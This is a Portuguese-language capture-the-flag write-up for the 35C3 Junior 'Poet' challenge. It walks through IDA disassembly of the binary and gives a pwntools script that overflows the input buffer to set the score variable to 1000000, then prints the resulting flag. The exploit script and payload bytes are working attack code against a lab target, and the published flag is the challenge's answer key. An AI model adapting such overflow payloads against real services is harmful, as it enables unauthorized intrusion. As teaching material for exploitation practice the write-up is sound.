## [35C3CTF](https://ctftime.org/event/718)
### Nome: [Poet](https://35c3ctf.ccc.ac/uploads/juniorctf/poet-724c1a07d5cf958381856c332e9019d57b5d51bf.zip)
#### Dificuldade: Muito fácil
**Descrição**: 
*We are looking for the  poe  of the year:* `nc 35.207.132.47 22223`
## Levantamento de informações
Ao baixarmos e extrairmos o arquivo zip, obtemos o arquivo Poet:
                                                                                                                                                                            
    C:\Users\ecarlosn\Desktop\poetwu                                                                                                                                        
    > File poet                                                                                                                                                             
    poet: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=145cad36473cb
    96072142f67bbde20e991c5a4b7, not stripped                                                                                                                               
*Antes de qualquer ação, vejamos o que o executável faz.*

    **********************************************************
    * We are searching for the poet of the year 2018.        *
    * Submit your one line poem now to win an amazing prize! *
    **********************************************************
    Enter the poem here:
    > happy new year
    Who is the author of this poem?
    > deadlock
    
    +---------------------------------------------------------------------------+
    THE POEM
    happy new year
    SCORED 0 POINTS.
    
    SORRY, THIS POEM IS JUST NOT GOOD ENOUGH.
    YOU MUST SCORE EXACTLY 1000000 POINTS.
    TRY AGAIN!
    +---------------------------------------------------------------------------+

**"SORRY, THIS POEM IS JUST NOT GOOD ENOUGH.
    YOU MUST SCORE EXACTLY 1000000 POINTS.
    TRY AGAIN!"**
    *A mensagem exibida diz que precisamos pontuar exatamente **1000000**. Hora de analisar o executável.*

## Solução
 Para a análise em questão, foi utilizado o [IDA](https://www.hex-rays.com/products/ida/support/download_freeware.shtml).

![IDA screenshot](https://i.imgur.com/XookLxm.png)

*No endereço **00000000004009D3** é possível vizualizar uma chamada à função **rate_poem( )**. Vejamos o que ela faz.*

    .text:000000000040080C loc_40080C:                             ; CODE XREF: rate_poem+8B↓j
    .text:000000000040080C                                         ; rate_poem+A2↓j ...
    .text:000000000040080C                 add     cs:dword_6024E0, 64h
    .text:0000000000400813
    .text:0000000000400813 loc_400813:                             ; CODE XREF: rate_poem+147↓j
    .text:0000000000400813                 lea     rsi, delim      ; " \n"
    .text:000000000040081A                 mov     edi, 0          ; s
    .text:000000000040081F                 call    _strtok
    .text:0000000000400824                 test    rax, rax
    .text:0000000000400827                 jz      loc_400909
    .text:000000000040082D
    .text:000000000040082D loc_40082D:                             ; CODE XREF: rate_poem+53↑j
    .text:000000000040082D                 mov     ecx, 5
    .text:0000000000400832                 mov     rsi, rax
    .text:0000000000400835                 mov     rdi, rbx
    .text:0000000000400838                 repe cmpsb
    .text:000000000040083A                 setnbe  dl
    .text:000000000040083D                 sbb     dl, 0
    .text:0000000000400840                 test    dl, dl
    .text:0000000000400842                 jz      short loc_40080C
    .text:0000000000400844                 mov     ecx, 4
    ...
    ...
    ...
    .text:0000000000400889                 mov     ecx, 7
    .text:000000000040088E                 lea     rdi, aRepeat    ; "repeat"
    ...
    ...
    .text:00000000004008A0                 test    dl, dl
    .text:00000000004008A2                 jz      loc_40080C
    .text:00000000004008A8                 mov     ecx, 4
    .text:00000000004008AD                 lea     rdi, aCtf       ; "CTF"
    .text:00000000004008B4                 mov     rsi, rax
    .text:00000000004008B7                 repe cmpsb
    .text:00000000004008B9                 setnbe  dl
    .text:00000000004008BC                 sbb     dl, 0
    .text:00000000004008BF                 test    dl, dl
    .text:00000000004008C1                 jz      loc_40080C
    .text:00000000004008C7                 mov     ecx, 8
    .text:00000000004008CC                 lea     rdi, aCapture   ; "capture"
    .text:00000000004008D3                 mov     rsi, rax
    ...
    ...
    .text:00000000004008DE                 test    dl, dl
    .text:00000000004008E0                 jz      loc_40080C
    .text:00000000004008E6                 mov     ecx, 5
    .text:00000000004008EB                 lea     rdi, aFlag      ; "flag"
    ...
    ...
    .text:00000000004008FC                 test    al, al
    .text:00000000004008FE                 jnz     loc_400813
    .text:0000000000400904                 jmp     loc_40080C
    .text:0000000000400909 ; ---------------------------------------------------------------------------
*A função nos retorna uma série de comparações com palavras específicas (**flag, pwn, CTF, capture**...).
Apesar das palavras da função nos retornarem pontos acima de Zero:*

    Enter the poem here:
    > flag
    Who is the author of this poem?
    > pwn
    +--------------------------------------------
    THE POEM
    flag
    SCORED 100 POINTS.
    
    SORRY, THIS POEM IS JUST NOT GOOD ENOUGH.
    YOU MUST SCORE EXACTLY 1000000 POINTS.
    TRY AGAIN!
*Após algumas análises, percebe-se que são irrelevantes para nossa resolução.*
*Voltando à função main, pode-se ver uma outra comparação no endereço **00000000004009D8**:*
![IDA screenshot](https://i.imgur.com/N7L3rSF.png)

*A comparação feita acima verifica se [rbx+440h] é igual à f4240h. Caso essa condição seja verdadeira,  você recebe o resultado da chamada( **flag** ), caso contrário, recebemos a mensagem de erro "**\nSORRY, THIS POEM....*** .

*o **H** no final da sequência de letras e números nos indica que os valores estão em [Hexadecimal](https://pt.wikipedia.org/wiki/Sistema_de_numera%C3%A7%C3%A3o_hexadecimal). Usando qualquer método de conversão para base10(**Decimal**), descobrimos que:*

 - 0x440h = 1088 **base10**
 - 0x_f4240h = 1000000 **base10**

 *Ótimo, encontramos a comparação que é feita para validação do poema/autor. Então, precisamos fazer com que  o registrador **rbx + 1088 = 0xf4240**.*
 *Após uma depuração, pode-se perceber que o responsável pelo nosso input está em **[rbx+1088]** Desta forma, podemos montar nosso script.*
 No caso em questão, foi utilizada a lib [pwntools](http://docs.pwntools.com/en/stable/) no [python2.7](https://www.python.org/download/releases/2.7/).

*Sabendo que **rbx** precisa receber **1088** bytes e que o **cmp** trabalha com os últimos**4 bytes**, enviamos **1084** bytes aleatórios + valor à ser comparado nos últimos .*
   

    from pwn import *
    
    r = remote('35.207.132.47', '22223')   
    print r.recvuntil('Enter the poem here:\n')
    r.sendline('aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa\x40\x42\x0f\x00')
    print r.recvuntil('this poem?\n')
    r.sendline('aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa\x40\x42\x0f\x00')
    print r.recvline()
    print r.recvline()
    print r.recvuntil('POINTS')
    print r.recv(1024)

*No script, enviamos o valor em **Hexadecimal** nos últimos 4 bytes que formam 1088, assim, quando a comparação for feita, teremos que **0x_f4240h == 0x_f4240h** *

 - *As letras aleatórias no script podem ser substituídas por exemplo, por* "A" **1084. Feito desta maneira apenas por questões de entendimento geral.*

*após a execução:*

![enter image description here](https://i.imgur.com/AEo9lHY.png)
-
**FLAG     : **35C3_f08b903f48608a14cbfbf73c08d7bdd731a87d39****

---
## Recomendações para entendimento geral
[x64_cheatsheet.pdf](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf)
[Assembly Control Flow](https://en.wikibooks.org/wiki/X86_Assembly/Control_Flow)
[CMPx86](https://www.felixcloutier.com/x86/cmp)
